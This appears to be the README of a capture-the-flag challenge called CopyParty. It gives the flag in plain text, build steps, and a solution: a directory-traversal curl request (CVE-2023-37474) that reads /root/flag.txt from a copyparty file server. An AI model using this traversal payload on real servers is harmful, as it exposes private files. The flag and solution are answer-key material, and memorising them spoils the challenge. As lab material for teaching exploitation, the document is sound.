# NAME
CopyParty
# FLAG
Intake{3very0n3_n33ds_l1m1ts}
# Challenge Desc
My friend left his pc on while he went out so I setup a file server in his home directory so I can steal his passwords later. Can you help me find the flag?

# Creation
1. Change flag in docker root
2. Build docker container

# Solution
- Vulnerable to directory traversal
- CVE-2023-37474
- https://www.exploit-db.com/exploits/51636
- `curl localhost:3923/.cpr/%2F/root/flag.txt`
